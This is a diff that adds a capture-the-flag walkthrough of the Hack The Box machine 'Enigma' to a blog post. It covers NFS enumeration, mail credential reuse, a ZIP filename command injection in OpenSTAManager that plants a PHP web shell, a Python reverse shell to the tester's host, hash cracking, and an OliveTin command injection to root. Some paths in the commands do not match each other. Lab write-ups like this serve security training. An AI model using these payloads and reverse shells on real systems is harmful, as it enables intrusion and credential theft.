@@ -1,7 +1,7 @@
 ---
 title: "Enigma"
-date: "2026-09-10"
-summary: "Walkthrough for Enigma on Hack The Box, release after machine retirement"
+date: "2026-11-24"
+summary: "A world-readable NFS export and recycled mail credentials lead to OpenSTAManager command injection, then OliveTin finishes the escalation to root."
 platform: "htb"
 machineName: "Enigma"
 difficulty: "easy"
@@ -106,4 +106,320 @@ From the Nmap scan output, we can see that NFS (Network File System) is running 
 
 `mountd` is a service on Unix and Linux systems that handles file system mount requests from remote machines using the NFS protocol.
 
-*This box is still active on HackTheBox. Once retired, this writeup will be published for public access as per HackTheBox's policy on publishing content from their platform*
+Let us enumerate the `mountd` service using `showmount` to check for any exportable directories:-
+
+```bash
+└─$ showmount -e 10.129.239.191
+Export list for 10.129.239.191:
+/srv/nfs/onboarding *
+```
+
+Ok, this looks interesting. An `onboarding` directory. Let us try to mount it on our system and export its contents:-
+
+Create a mount point:-
+
+```bash
+sudo mkdir /mnt/nfs
+```
+
+Then mount,
+
+```bash
+sudo mount -t nfs <MACHINE_IP>:/home /mnt/nfs
+```
+
+Checking the mount:-
+
+![Fig1: World-Readable Mount](./img/Enigma/image.png)
+
+Fig1: World-Readable Mount
+
+`New_Employee_Access.pdf` contains,
+
+![Fig2: Contents of New_Employee_Access.pdf](./img/Enigma/image%201.png)
+
+Fig2: Contents of New_Employee_Access.pdf
+
+user Kevin’s credentials for their web mail service at `mail001.enigma.htb` !
+
+`kevin:Enigma2024!`
+
+## Roundcube Webmail
+
+Adding the `mail001` subdomain to our hosts file, and then visiting it, we encounter a login page:-
+
+![Fig3: Roundcube Webmail Login Page](./img/Enigma/image%202.png)
+
+Fig3: Roundcube Webmail Login Page
+
+Using `kevin:Enigma2024!` , we get into the email dashboard of Kevin:-
+
+![Fig4: Email Inbox of `kevin`](./img/Enigma/image%203.png)
+
+Fig4: Email Inbox of `kevin`
+
+### Credential Reuse by User `sarah`
+
+Not finding much on user `kevin` `s dashboard, I decided to try if the password `Enigma2024!` for the user `sarah` too. And it was valid!
+
+We can see there is an interesting email in `sarah` ’s inbox:-
+
+![Fig5: Email Inbox of `sarah`](./img/Enigma/image%204.png)
+
+Fig5: Email Inbox of `sarah`
+
+We have got access to an account named `admin` in to the service OpneSTAManager running at subdomain `support_001.enigma.htb` , using the credentials `admin:Ne3s4rtars78s` 
+
+## `admin` Access to OpenSTAManager
+
+![Fig6: OpenSTAManager Login Portal](./img/Enigma/image%205.png)
+
+Fig6: OpenSTAManager Login Portal
+
+Using the login credentials we obtained, we can login as the `admin` user to OpenSTAManager and encounter its dashboard:-
+
+![Fig7: OpenSTAManager `admin` dashboard](./img/Enigma/image%206.png)
+
+Fig7: OpenSTAManager `admin` dashboard
+
+![Fig8: OpenSTAManager version information](./img/Enigma/image%207.png)
+
+Fig8: OpenSTAManager version information
+
+From Fig8, we can see the OpenSTAManager in use is `2.9.8` 
+
+Searching for vulnerabilities associated with this version of OpenSTAManager, leads us to CVE-2025-69212, an OS Command Injection vulnerability.
+
+### CVE-2025-69212 - OS Command Injection
+
+According to https://github.com/advisories/GHSA-25fp-8w8p-mx36, an authenticated attacker can upload a ZIP file containing a .p7m file with a malicious filename to execute arbitrary system commands on the server. Affected versions of OpenSTAManager are 2.9.8 and before.
+
+Code for creating a malicious ZIP file using the PoC in the advisory as reference:-
+
+```python
+import zipfile
+
+cmd = "cd files && echo '<?php system($_GET[\"c\"]); ?>' > SHELL.php"
+malicious_filename = f'invoice.p7m";{cmd};echo ".p7m'
+
+with zipfile.ZipFile('exploit.zip', 'w') as zf:
+    zf.writestr(malicious_filename, b"DUMMY_P7M_CONTENT")
+```
+
+Uploading the `exploit.zip` file in the vulnerable sales invoice upload section (Fig9):-
+
+![Fig9: Vulnerable Upload Component](./img/Enigma/image%208.png)
+
+Fig9: Vulnerable Upload Component
+
+```jsx
+POST /actions.php HTTP/1.1
+Host: support_001.enigma.htb
+Content-Length: 761
+X-Requested-With: XMLHttpRequest
+Accept-Language: en-GB,en;q=0.9
+Accept: */*
+Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryBbzArC9BZSP6nu7k
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36
+Origin: http://support_001.enigma.htb
+Referer: http://support_001.enigma.htb/controller.php?id_module=14
+Accept-Encoding: gzip, deflate, br
+Cookie: PHPSESSID=57qun8h8vps2erdsa122pf0ubu
+Connection: keep-alive
+
+------WebKitFormBoundaryBbzArC9BZSP6nu7k
+Content-Disposition: form-data; name="blob1"; filename="exploit.zip"
+Content-Type: application/zip
+
+PK
+```
+
+![Fig10: Exploit Sent](./img/Enigma/image%209.png)
+
+Fig10: Exploit Sent
+
+According to the PoC, the 500 error is expected as XML parsing fails after command execution.
+
+Let us check if our webshell is working or not with an `id` request through `curl`:-
+
+```jsx
+curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
+```
+
+![Fig11: Working Webshell](./img/Enigma/image%2010.png)
+
+Fig11: Working Webshell
+
+From Fig11, we can see that we’ve got a working web shell.
+
+Using the payload:
+
+```bash
+curl "http://support_001.enigma.htb/files/SHELL.php?c=python3%20-c%20%27import%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.16.100%22%2C8998%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3Bos.dup2%28s.fileno%28%29%2C2%29%3Bimport%20pty%3B%20pty.spawn%28%22sh%22%29%27"
+```
+
+We get reverse-shell access as the user `www-data`
+
+![Fig12: Reverse shell as user `www-data`](./img/Enigma/image%2011.png)
+
+Fig12: Reverse shell as user `www-data`
+
+#### MYSQL Credentials
+
+While enumerating the system, I found the `config.inc.php` file in the OpenSTAManager directory.
+
+![Fig13: MYSQL user `brollin` ‘s credentials](./img/Enigma/image%2012.png)
+
+Fig13: MYSQL user `brollin` ‘s credentials
+
+From Fig13, we can see that we have obtained access to the MYSQL user `brollin` ’s credentials
+
+`brollin:Fri3nds@9099`
+
+Using `mysql` command to login as `brollin` :
+
+```bash
+mysql -u brollin -p'Fri3nds@9099'
+```
+
+Enumerating the MYSQL database we find user hashes in the table `zz_users` inside the `openstamanager` table:-
+
+![Fig14: User Hashes](./img/Enigma/image%2013.png)
+
+Fig14: User Hashes
+
+Using `hashcat` to crack user `haris` ’s hash:-
+
+```bash
+hashcat -m 3200 -a 0 -w 3 -O hash.txt /usr/share/wordlists/rockyou.txt
+```
+
+We get the credentials as `haris:bestfriends` 
+
+```bash
+www-data@enigma:~/html/openstamanager$ su haris
+Password: 
+su: Authentication failure
+www-data@enigma:~/html/openstamanager$ su haris
+Password: 
+haris@enigma:/var/www/html/openstamanager$ id
+uid=1000(haris) gid=1000(haris) groups=1000(haris),100(users)
+```
+
+We are logged in as the user `haris` 
+
+## Privilege Escalation
+
+While enumerating for local listening connections using `netstat`  I discovered this:-
+
+```bash
+netstat -ano | grep 127.0.0.1
+tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:25            0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN      off (0.00/0/0)
+tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
+udp        0      0 127.0.0.1:32845         127.0.0.53:53           ESTABLISHED off (0.00/0/0)
+udp        0      0 127.0.0.1:875           0.0.0.0:*                           off (0.00/0/0)
+```
+
+The local service on port `1337` seems to be anomalous. Let’s investigate it.
+
+Using `netcat` to enumerate the service shows that its an internal web application:-
+
+```bash
+nc 127.0.0.1 1337
+test
+HTTP/1.1 400 Bad Request
+Content-Type: text/plain; charset=utf-8
+Connection: close
+
+400 Bad Request
+```
+
+Sending a `curl` request to the webapp shows that its an `OlivTin` application.
+
+![Fig15: OliveTin Application](./img/Enigma/image%2014.png)
+
+Fig15: OliveTin Application
+
+Also if we check running processes for OliveTin, we can see that its running the context of the `root` user. Ideal for privilege escalation.
+
+```bash
+ps aux | grep "Olive"
+root        1522  0.0  0.4 1238736 16256 ?       Ssl  00:28   0:00 /usr/local/bin/OliveTin
+haris       2276  0.0  0.0    6900  2412 pts/1    S+   00:57   0:00 grep --color=auto Olive
+```
+
+Enumerating the `OliveTin` binary:-
+
+```bash
+haris@enigma:/$ /usr/local/bin/OliveTin --version                                                                                           
+INFO OliveTin is just printing the startup message  commit="d22bdeb" date="2026-02-14T20:41:10Z" version="3000.10.0"   
+```
+
+We can see that the `OliveTin` application is of version `3000.10.0`
+
+### CVE-2026-27626 - OliveTin OS Command Injection
+
+OliveTin version 3000.10.0 and earlier contain a critical OS command injection vulnerability through the `password` argument .
+
+Using PoC at https://github.com/advisories/GHSA-49gm-hh7w-wfvf to confirm exploitation:-
+
+```bash
+curl -sS -X POST http://127.0.0.1:1337/api/StartActionAndWait \
+  -H 'Content-Type: application/json' \
+  --data-binary '{
+    "actionId":"backup_database",
+    "arguments":[
+      {"name":"db_user","value":"backup_svc"},
+      {"name":"db_pass","value":"test123"},
+      {"name":"db_name","value":"production"}
+    ]
+  }'
+```
+
+The response confirmed the action executed:
+
+```json
+"actionTitle":"Backup Database"
+"executionStarted":true
+"executionFinished":true
+```
+
+Exploiting the vulnerability (to avoid shell quoting issues, I used Python to construct the JSON payload):-
+
+```python
+python3 - <<'PY' >/tmp/privesc.json
+import json
+
+print(json.dumps({
+    "actionId": "backup_database",
+    "arguments": [
+        {"name": "db_user", "value": "backup_svc"},
+        {"name": "db_pass", "value": "'; id > /tmp/res; #"},
+        {"name": "db_name", "value": "production"}
+    ]
+}))
+PY
+```
+
+Sending the req to OliveTin using `curl` :
+
+```bash
+curl -sS -X POST http://127.0.0.1:1337/api/StartActionAndWait \
+  -H 'Content-Type: application/json' \
+  --data-binary @/tmp/req.json
+```
+
+Checking the `/tmp/res` file’s contents:-
+
+```bash
+haris@enigma:/tmp$ cat res
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+OS command injection as `root` confirmed!
+
+## Learnings
+
+- Always, try the same password for other accounts before doing anything else. Tried for SSH, but didn’t try for Roundmail initially :)
